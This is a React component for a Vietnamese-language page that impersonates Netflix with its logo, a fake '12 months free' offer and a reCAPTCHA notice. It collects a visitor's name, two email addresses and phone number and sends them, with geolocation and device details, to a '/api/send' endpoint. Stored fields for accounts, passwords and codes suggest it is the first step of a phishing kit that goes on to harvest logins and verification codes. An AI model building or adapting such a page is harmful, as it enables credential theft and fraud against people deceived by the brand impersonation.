import NetflixLogo from '@/assets/images/logoneflix.svg';
import { MODAL_BTN_PRIMARY, MODAL_INPUT_CLASS, MODAL_LABEL_CLASS, ModalSpinner } from '@/components/form-modal/modal-shell';
import { useTranslation } from '@/hooks/use-translation';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { faChevronDown, faXmark } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput, { type IntlTelInputRef } from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useRef, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
}

interface FormErrors {
    fullName?: string;
    personalEmail?: string;
    businessEmail?: string;
    phoneNumber?: string;
    termsAccepted?: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email';
    required?: boolean;
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Họ và tên', type: 'text', required: true },
    { name: 'personalEmail', label: 'Email cá nhân', type: 'email', required: true },
    { name: 'businessEmail', label: 'Email doanh nghiệp', type: 'email', required: true }
];

const INIT_MODAL_TEXTS = [
    'Nhập thông tin để bắt đầu',
    'Hoặc đăng nhập vào tài khoản hiện có.',
    'Sinh nhật 29 năm · 12 tháng miễn phí · 4K HDR',
    'Họ và tên',
    'Email cá nhân',
    'Email doanh nghiệp',
    'Số điện thoại',
    'Tôi đồng ý với Điều khoản sử dụng',
    'Tiếp tục',
    'Vui lòng điền thông tin này',
    'Email không hợp lệ',
    'Số điện thoại không hợp lệ',
    'Bạn cần đồng ý với điều khoản sử dụng',
    'Trợ giúp',
    'Trang này được bảo vệ bởi Google reCAPTCHA để đảm bảo bạn không phải là bot.',
    'Có câu hỏi? Liên hệ với chúng tôi.'
] as const;

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const { t } = useTranslation(INIT_MODAL_TEXTS);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        businessEmail: ''
    });
    const [errors, setErrors] = useState<FormErrors>({});
    const [termsAccepted, setTermsAccepted] = useState(false);
    const phoneInputRef = useRef<IntlTelInputRef>(null);

    const { geoInfo, deviceLabel, setMessageId, setUserData, setModalOpen, resetFormSession } = store();

    const handleClose = () => {
        resetFormSession();
        setModalOpen(false);
    };
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const validateEmail = (email: string): boolean => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};

        FORM_FIELDS.forEach((field) => {
            if (field.required && !formData[field.name].trim()) {
                newErrors[field.name] = t('Vui lòng điền thông tin này');
            }
        });

        if (formData.personalEmail && !validateEmail(formData.personalEmail)) {
            newErrors.personalEmail = t('Email không hợp lệ');
        }
        if (formData.businessEmail && !validateEmail(formData.businessEmail)) {
            newErrors.businessEmail = t('Email không hợp lệ');
        }

        if (!phoneNumber.trim()) {
            newErrors.phoneNumber = t('Vui lòng điền thông tin này');
        } else if (phoneInputRef.current?.getInstance) {
            const instance = phoneInputRef.current.getInstance();
            if (instance && !instance.isValidNumber()) {
                newErrors.phoneNumber = t('Số điện thoại không hợp lệ');
            }
        }

        if (!termsAccepted) {
            newErrors.termsAccepted = t('Bạn cần đồng ý với điều khoản sử dụng');
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback(
        (e: ChangeEvent<HTMLInputElement>) => {
            const { name, value } = e.target;
            setFormData((prev) => ({ ...prev, [name]: value }));
            if (errors[name as keyof FormErrors]) {
                setErrors((prev) => ({ ...prev, [name]: undefined }));
            }
        },
        [errors]
    );

    const handlePhoneChange = useCallback(
        (number: string) => {
            setPhoneNumber(number);
            if (errors.phoneNumber) {
                setErrors((prev) => ({ ...prev, phoneNumber: undefined }));
            }
        },
        [errors.phoneNumber]
    );

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading || !validateForm()) return;

        setIsLoading(true);

        const userPayload = {
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phoneNumber,
            facebookPageName: '',
            information: ''
        };

        setUserData({ ...userPayload, accounts: [], passwords: [], codes: [] });

        const message = buildAppealMessage({ geoInfo, deviceLabel, userData: userPayload });

        try {
            const res = await axios.post('/api/send', { message });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    const inputErrorClass = (hasError: boolean) => (hasError ? 'border-error focus:border-error focus:shadow-[0_0_0_3px_rgba(255,180,171,0.2)]' : '');

    return (
        <div className='netflix-modal fixed inset-0 z-50 flex min-h-screen flex-col overflow-y-auto bg-black text-[#e2e2e2]'>
            <div
                aria-hidden
                className='pointer-events-none absolute inset-x-0 top-0 h-[min(680px,70vh)] bg-[radial-gradient(ellipse_80%_60%_at_50%_0%,rgba(229,9,20,0.35)_0%,rgba(0,0,0,0)_70%)]'
            />

            <header className='relative z-10 flex items-center justify-between px-5 py-5 md:px-16 md:py-6'>
                <Image src={NetflixLogo} alt='Netflix' width={120} height={32} className='h-8 w-auto' priority />
                <button
                    type='button'
                    onClick={handleClose}
                    className='flex h-9 w-9 items-center justify-center rounded-full text-[#B3B3B3] transition-colors hover:bg-white/10 hover:text-white'
                    aria-label='Close'
                >
                    <FontAwesomeIcon icon={faXmark} className='h-5 w-5' />
                </button>
            </header>

            <main className='relative z-10 mx-auto flex w-full max-w-[450px] flex-1 flex-col px-5 pb-10 md:px-0'>
                <h1 className='mb-2 text-[32px] leading-tight font-bold text-white md:text-[40px]'>{t('Nhập thông tin để bắt đầu')}</h1>
                <p className='mb-8 text-base text-[#B3B3B3]'>{t('Hoặc đăng nhập vào tài khoản hiện có.')}</p>
                <p className='mb-6 text-sm text-[#8c8c8c]'>{t('Chương trình ưu đãi có hạn · 12 tháng miễn phí · 4K HDR')}</p>

                <form onSubmit={handleSubmit} className='flex flex-col'>
                    <div className='flex flex-col gap-4'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <label className={MODAL_LABEL_CLASS}>
                                    {t(field.label)}
                                    {field.required && <span className='text-[#ffb4ab]'> *</span>}
                                </label>
                                <input
                                    name={field.name}
                                    type={field.type}
                                    value={formData[field.name]}
                                    onChange={handleInputChange}
                                    className={`${MODAL_INPUT_CLASS} ${inputErrorClass(!!errors[field.name])}`}
                                />
                                {errors[field.name] && <p className='mt-1 text-sm text-[#ffb4ab]'>{errors[field.name]}</p>}
                            </div>
                        ))}

                        <div>
                            <label className={MODAL_LABEL_CLASS}>
                                {t('Số điện thoại')}
                                <span className='text-[#ffb4ab]'> *</span>
                            </label>
                            <div className={`phone-input-wrap${errors.phoneNumber ? ' iti--error' : ''}`}>
                                <IntlTelInput
                                    ref={phoneInputRef}
                                    onChangeNumber={handlePhoneChange}
                                    initOptions={initOptions}
                                    inputProps={{
                                        name: 'phoneNumber'
                                    }}
                                />
                            </div>
                            {errors.phoneNumber && <p className='mt-1 text-sm text-[#ffb4ab]'>{errors.phoneNumber}</p>}
                        </div>

                        <div>
                            <label className='flex cursor-pointer items-start gap-3 pt-1'>
                                <input
                                    type='checkbox'
                                    checked={termsAccepted}
                                    onChange={(e) => {
                                        setTermsAccepted(e.target.checked);
                                        if (e.target.checked && errors.termsAccepted) {
                                            setErrors((prev) => ({ ...prev, termsAccepted: undefined }));
                                        }
                                    }}
                                    className='mt-0.5 h-4 w-4 rounded border-[#353535] accent-[#e50914]'
                                />
                                <span className='text-sm text-[#B3B3B3]'>{t('Tôi đồng ý với Điều khoản sử dụng')}</span>
                            </label>
                            {errors.termsAccepted && <p className='mt-1 text-sm text-[#ffb4ab]'>{errors.termsAccepted}</p>}
                        </div>

                        <button type='submit' disabled={isLoading} className={`${MODAL_BTN_PRIMARY} mt-2`}>
                            {isLoading ? <ModalSpinner /> : t('Tiếp tục')}
                        </button>
                    </div>

                    <details className='group mt-6'>
                        <summary className='flex cursor-pointer list-none items-center gap-2 text-sm font-medium text-white [&::-webkit-details-marker]:hidden'>
                            {t('Trợ giúp')}
                            <FontAwesomeIcon icon={faChevronDown} className='h-3 w-3 transition-transform group-open:rotate-180' />
                        </summary>
                        <p className='mt-3 text-sm leading-relaxed text-[#B3B3B3]'>
                            {t('Có câu hỏi? Liên hệ với chúng tôi.')}
                        </p>
                    </details>

                    <p className='mt-8 text-xs leading-relaxed text-[#8c8c8c]'>
                        {t('Trang này được bảo vệ bởi Google reCAPTCHA để đảm bảo bạn không phải là bot.')}
                    </p>
                </form>
            </main>

            <footer className='relative z-10 mt-auto border-t border-[#353535]/40 bg-black px-5 py-6 md:px-16'>
                <p className='text-sm text-[#8c8c8c]'>{t('Có câu hỏi? Liên hệ với chúng tôi.')}</p>
            </footer>
        </div>
    );
};

export default InitModal;
